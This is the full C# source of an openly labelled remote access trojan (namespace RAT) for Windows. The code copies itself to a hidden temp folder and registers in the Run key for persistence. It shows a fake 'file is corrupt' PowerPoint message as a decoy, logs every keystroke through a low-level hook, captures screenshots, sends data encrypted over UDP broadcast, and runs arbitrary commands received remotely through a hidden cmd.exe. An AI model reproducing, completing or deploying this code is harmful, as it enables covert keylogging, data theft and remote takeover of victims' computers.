using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace RAT
{
    class Program
    {
        /*
         * This is a RAT to remove please redownload and execute <Filename>.exe /clean
         * 
         * 
         * 
         */
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        public static String ran = "";
        public static void random()
        {
            Random rnd = new Random();
            int length = 30;
            for (var i = 0; i < length; i++)
            {
                ran += ((char)(rnd.Next(1, 26) + 64)).ToString();
            }
        }
        public class Server
        {
            public static IPAddress IP;
            public static Int32 port = 5632; // CHANGE THIS FOR EACH CLIENT
            public class Crypto
            {
                public String CalculateMD5Hash(string input)
                {
                    MD5 md5 = System.Security.Cryptography.MD5.Create();
                    byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
                    byte[] hash = md5.ComputeHash(inputBytes);
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < hash.Length; i++)
                    {
                        sb.Append(hash[i].ToString("X2"));
                    }
                    return sb.ToString();
                }
                public static String EncryptionKey = "WvuhYWUkjK5azPEW1s81V9K5qeC3XeCtXEhn6SKf9z68lH7APC2X8mJDMx6wdkdZWgcwuLWfWoVwgVbGPcJoDbrzcqWEzIMtLB7twtAPMfvyK6ipNYTkftZNnnQ9wYj64ZOE4gafJZI7yOBcvHwizgyGSax0rk4IJQ3daplaaihEBVnPESDwIK2pGiIOEFDdG0cl0F4W";
                public static Random rand = new Random();
                public static string Encrypt(string clearText)
                {
                    byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
                    using (Aes encryptor = Aes.Create())
                    {
                        byte[] IV = new byte[15];
                        rand.NextBytes(IV);
                        Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, IV);
                        encryptor.Key = pdb.GetBytes(32);
                        encryptor.IV = pdb.GetBytes(16);
                        using (MemoryStream ms = new MemoryStream())
                        {
                            using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                            {
                                cs.Write(clearBytes, 0, clearBytes.Length);
                                cs.Close();
                            }
                            clearText = Convert.ToBase64String(IV) + Convert.ToBase64String(ms.ToArray());
                        }
                    }
                    return clearText;
                }
                public static string Decrypt(string cipherText)
                {
                    byte[] IV = Convert.FromBase64String(cipherText.Substring(0, 20));
                    cipherText = cipherText.Substring(20).Replace(" ", "+");
                    byte[] cipherBytes = Convert.FromBase64String(cipherText);
                    using (Aes encryptor = Aes.Create())
                    {
                        Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, IV);
                        encryptor.Key = pdb.GetBytes(32);
                        encryptor.IV = pdb.GetBytes(16);
                        using (MemoryStream ms = new MemoryStream())
                        {
                            using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                            {
                                cs.Write(cipherBytes, 0, cipherBytes.Length);
                                cs.Close();
                            }
                            cipherText = Encoding.Unicode.GetString(ms.ToArray());
                        }
                    }
                    return cipherText;
                }
            }
            public class Receiver
            {
                public void start()
                {
                    StartListening();
                }
                private readonly UdpClient udp = new UdpClient(Server.port);
                private void StartListening()
                {
                    this.udp.BeginReceive(Receive, new object());
                }
                private void Receive(IAsyncResult ar)
                {
                    IPEndPoint ip = new IPEndPoint(Server.IP, Server.port);
                    byte[] bytes = udp.EndReceive(ar, ref ip);
                    string message = Encoding.ASCII.GetString(bytes);
                    Console.WriteLine(Crypto.Decrypt(message));
                    commands(Crypto.Decrypt(message));
                    StartListening();
                }
                public static void commands(String input)
                {
                    if (input.Contains("!exec"))
                    {
                        String exec = input.Substring(input.IndexOf("!exec") + 6);
                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        startInfo.FileName = "cmd.exe";
                        startInfo.Arguments = "/C " + exec;
                        process.StartInfo = startInfo;
                        process.Start();
                        Sender send = new Sender();
                        send.Send("ran cmd.exe " + exec);
                    }
                }
            }
            public class Sender
            {
                public void Send(String text)
                {
                    UdpClient client = new UdpClient();
                    IPEndPoint ip = new IPEndPoint(IPAddress.Broadcast, Server.port);
                    byte[] bytes = Encoding.ASCII.GetBytes(Crypto.Encrypt(text));
                    client.Send(bytes, bytes.Length, ip);
                    client.Close();
                }
                public void SendBytes(Byte[] bytes)
                {
                    UdpClient client = new UdpClient();
                    IPEndPoint ip = new IPEndPoint(IPAddress.Broadcast, Server.port);
                    client.Send(bytes, bytes.Length, ip);
                    client.Close();
                }
                public void SendImage(Byte[] bytes)
                {
                    byte[] smallPortion = bytes.Take(4).ToArray();
                    byte[] largeBytes = bytes.Skip(4).Take(5).ToArray();
                    UdpClient client = new UdpClient();
                    IPEndPoint ip = new IPEndPoint(IPAddress.Broadcast, Server.port);
                    client.Send(bytes, bytes.Length, ip);
                    client.Close();
                }
            }
        }
        public static String[] files = new string[]
        {
            Path.GetTempPath()+"CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316"
        };
        static void Main(string[] args)
        {
            try
            {
                random();
                Console.WriteLine("[!] Starting");
                try
                {
                    if (args[0].Contains("clean")) { cleanup(); }
                }
                catch { }
                Console.WriteLine("[!] Skipping Clean");
                Console.WriteLine("[!] Hiding");
                try
                {
                    String[] fileloc = File.ReadAllLines(files[0]);
                    if (System.Reflection.Assembly.GetExecutingAssembly().Location.Contains(Path.GetTempPath() + fileloc[0]))
                    {
                        Console.WriteLine("[!] Hiding Done");
                        Console.WriteLine("[!] Adding as startup program");
                        Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true); //Adds to startup programs
                        key.SetValue(fileloc[0], System.Reflection.Assembly.GetExecutingAssembly().Location);
                        /*
                         * START PAYLOAD HERE
                         */
                        System.Windows.Forms.MessageBox.Show("This file is corrupt and cannot be opened.", "Microsoft Powerpoint",
                            System.Windows.Forms.MessageBoxButtons.OK,
                            System.Windows.Forms.MessageBoxIcon.Warning);

                        Server.Sender sender = new Server.Sender();

                        string hostName = Dns.GetHostName();
                        Server.IP = Dns.GetHostByName(hostName).AddressList[0];
                        Server.Receiver receiver = new Server.Receiver();
                        ScreenCapture cap = new ScreenCapture();
                        receiver.start();
                        sender.Send("Arrrrgggg I am now a zombie..... " + Server.IP.ToString() + ":" + Server.port);
                        Console.WriteLine("[!] WOW now we are here! " + System.Reflection.Assembly.GetExecutingAssembly().Location);
                        Image screenshot = ScreenCapture.CaptureActiveWindow();
                        byte[] img = ScreenCapture.ImgtoByte(screenshot);
                        Application.EnableVisualStyles();
                        Application.SetCompatibleTextRenderingDefault(false);
                        _hookID = SetHook(_proc);
                        Application.Run();
                        UnhookWindowsHookEx(_hookID);
                        Console.ReadLine();

                    }
                }
                catch (Exception e) { Console.WriteLine(e); }
                Hide();
                Console.ReadLine();
            }
            catch
            {
                cleanup();
            }
        }
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [STAThread]
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                if ((Keys)vkCode == Keys.PrintScreen)
                {
                }
                if ((Keys)vkCode == Keys.Enter)
                {
                    Program.Server.Sender sender = new Server.Sender();
                    KeysConverter kc = new KeysConverter();
                    sender.Send(kc.ConvertToString((Keys)vkCode));
                }
                else
                {
                    Program.Server.Sender sender = new Server.Sender();
                    KeysConverter kc = new KeysConverter();
                    sender.Send(kc.ConvertToString((Keys)vkCode));
                }

            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("User32.dll", CharSet = CharSet.Unicode)]
        public static extern int MessageBox(IntPtr h, string m, string c, int type);
        public class ScreenCapture
        {
            [DllImport("user32.dll")]
            private static extern IntPtr GetForegroundWindow();

            [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
            public static extern IntPtr GetDesktopWindow();

            [StructLayout(LayoutKind.Sequential)]
            private struct Rect
            {
                public int Left;
                public int Top;
                public int Right;
                public int Bottom;
            }

            [DllImport("user32.dll")]
            private static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);

            public static System.Drawing.Image CaptureDesktop()
            {
                return CaptureWindow(GetDesktopWindow());
            }

            public static Bitmap CaptureActiveWindow()
            {
                return CaptureWindow(GetForegroundWindow());
            }

            public static Bitmap CaptureWindow(IntPtr handle)
            {
                var rect = new Rect();
                GetWindowRect(handle, ref rect);
                var bounds = new Rectangle(rect.Left, rect.Top, rect.Right - rect.Left, rect.Bottom - rect.Top);
                var result = new Bitmap(bounds.Width, bounds.Height);

                using (var graphics = Graphics.FromImage(result))
                {
                    graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
                }

                return result;
            }
            public static byte[] ImgtoByte(Image x)
            {
                ImageConverter _imageConverter = new ImageConverter();
                byte[] xByte = (byte[])_imageConverter.ConvertTo(x, typeof(byte[]));
                return xByte;
            }
        }
        public static void Hide()
        {

            try
            {
                using (StreamWriter sw = File.CreateText(files[0]))
                {
                    sw.Write(ran);
                }
            }
            catch { }
            String[] loc = File.ReadAllLines(files[0]);
            bool found = false;
            foreach (String check in loc)
            {
                if (Directory.Exists(Path.GetTempPath() + check))
                {
                    found = true;
                    break;
                }
            }
            try
            {
                Directory.CreateDirectory(Path.GetTempPath() + loc[0]);
                File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Path.GetTempPath() + loc[0] + "\\CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316.exe");
                restart(loc[0]);
            }
            catch
            {
                restart(loc[0]);
            }
        }
        public static void restart(String loc)
        {
            try
            {
                System.Diagnostics.Process.Start(Path.GetTempPath() + loc + "\\CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316.exe");
                System.Environment.Exit(1);
            }
            catch
            {
                cleanup();
            }

        }
        public static void cleanup()
        {
            String[] fileloc = File.ReadAllLines(files[0]);
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.DeleteValue(fileloc[0], false);
            String exec = " taskkill /f /im CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316.exe";
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + exec;
            process.StartInfo = startInfo;
            process.Start();
            try
            {
                String[] loc = File.ReadAllLines(files[0]);
                Directory.Delete(Path.GetTempPath() + loc[0], true);
            }
            catch { Console.WriteLine("[!] Failed Deepclean doing essential clean"); }
            foreach (String file in files)
            {
                try
                {
                    Directory.Delete(file);
                }
                catch
                {
                    File.Delete(file);
                }
            }
            System.Environment.Exit(1);
        }
    }
}
